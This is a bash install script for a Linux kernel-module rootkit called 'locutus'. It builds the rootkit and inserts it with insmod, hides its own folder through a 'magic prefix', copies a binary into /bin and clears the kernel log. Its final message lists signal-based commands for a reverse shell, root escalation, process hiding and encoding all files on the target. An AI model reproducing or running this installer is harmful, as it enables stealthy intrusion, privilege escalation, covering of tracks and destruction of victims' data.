#!/bin/bash
echo "installing locutus..."
mv $(pwd) ../borg_d3monized # add magic prefix to our folder to be hidden

cd locutus
sudo apt install build-essential -y # prepare for building
bash make.sh # build rk
sudo mv borg_transwarp /bin/
mv locutus borg_locutus # add magic prefix
insmod borg_locutus # insert lkm
dmesg --clear # clear log

echo -ne "installed!\nget a reverse shell by running locutus/trigger.sh <target ip>\nget root by using kill -64 $$\nhide a process by using kill -63 pid\nencode all files on the target with kill -62 $RANDOM\n"
